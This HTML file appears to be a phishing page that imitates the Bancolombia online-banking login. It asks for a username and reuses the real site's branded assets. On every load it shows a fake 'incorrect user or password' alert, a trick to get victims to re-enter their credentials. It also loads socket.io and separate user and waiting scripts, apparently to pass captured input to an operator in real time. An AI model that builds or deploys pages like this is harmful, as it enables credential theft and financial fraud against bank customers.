<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Autenticación Bancolombia</title>
    <!-- Vinculación a Bootstrap -->
    <link
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles/estilos.css" />
    <link rel="icon" type="image/png" href="./media/logo.png" />
    <script src="../../js/functions.js"></script>
  </head>
  <body>
    <header class="header">
      <img
        src="media/headerIconBancolombia.e9678f112a702758542f8f98283cea47.svg"
        alt="Logo Centro"
        class="logo-center"
      />
      <div class="exit-container">
        <span class="exit-text">Salir</span>
        <img
          src="media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg"
          alt="Icono Salir"
          class="logo-right"
        />
      </div>
    </header>

    <div class="welcome-container">
      <span class="welcome-text">Te damos la bienvenida</span>
    </div>

    <div class="modal-container">
      <p class="modal-text">
        El usuario es el mismo con el que<br />
        ingresas a la<br />
        <strong>Sucursal Virtual Personas</strong>
      </p>

      <!-- Nueva sección añadida -->
      <div class="user-info">
        <div class="user-details">
          <img
            src="media/user.39a37ef47269f6d65906fbb23186e4b6.svg"
            alt="Icono Usuario"
            class="user-icon"
          />
          <input
            type="text"
            class="user-input"
            placeholder="Usuario"
            id="user-input"
          />
        </div>
        <hr class="separator" />
        <a href="#" class="forgot-user">¿Olvidaste tu usuario?</a>
      </div>

      <!-- Nuevos botones añadidos -->
      <div class="buttons-container">
        <button class="btn volver" id="back-button">Volver</button>
        <button class="btn continuar" id="continue">Continuar</button>
      </div>
    </div>

    <!-- Nuevo contenedor para la imagen "trazo" -->
    <div class="trazo-container">
      <img
        src="media/trazo-desktop.3de67dbd4b31f3798f8a1d3e3a90197c.svg"
        alt="Trazo"
        class="trazo-image"
      />
    </div>

    <!-- Alerta personalizada -->
    <div
      id="custom-alert"
      class="alert alert-danger"
      role="alert"
      style="display: none"
    >
      Usuario incorrecto o contraseña incorrecta. Por favor, inténtalo de nuevo.
    </div>

    <!-- Scripts de Bootstrap y JavaScript -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Mostrar la alerta personalizada
        const alertBox = document.getElementById("custom-alert");
        alertBox.style.display = "block";

        // Opcional: Ocultar la alerta después de unos segundos
        setTimeout(() => {
          alertBox.style.display = "none";
        }, 5000); // Ocultar después de 5 segundos
      });
    </script>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const userInput = document.getElementById("user-input");

        userInput.addEventListener("input", function () {
          const value = userInput.value;
          if (value.length > 0 && !isNaN(value[0])) {
            userInput.value = value.slice(1); // Elimina el primer carácter si es un número
          }
        });
      });
    </script>
    <script src="js/user.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
    <script src="js/waiting.js"></script>
    <script src="js/back.js"></script>
  </body>
</html>
